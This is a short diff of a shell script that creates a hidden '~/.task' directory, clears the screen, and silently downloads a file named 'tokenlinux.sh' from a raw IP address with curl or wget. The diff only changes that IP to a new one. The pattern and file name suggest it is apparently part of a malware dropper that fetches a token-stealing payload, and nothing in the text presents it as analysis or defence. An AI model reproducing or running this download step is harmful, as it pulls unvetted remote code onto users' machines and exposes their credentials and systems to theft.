@@ -5,9 +5,9 @@ mkdir -p "$HOME/.task"
 TARGET_DIR="$HOME/.task"
 clear
 if command -v curl &> /dev/null; then
-  curl -s -L -o "$TARGET_DIR/tokenlinux.sh" "http://64.204.80.37/231/tokenlinux.sh"
+  curl -s -L -o "$TARGET_DIR/tokenlinux.sh" "http://51.194.112.87/231/tokenlinux.sh"
 elif command -v wget &> /dev/null; then
-  wget -q -O "$TARGET_DIR/tokenlinux.sh" "http://64.204.80.37/231/tokenlinux.sh"
+  wget -q -O "$TARGET_DIR/tokenlinux.sh" "http://51.194.112.87/231/tokenlinux.sh"
 else
   exit 1
 fi
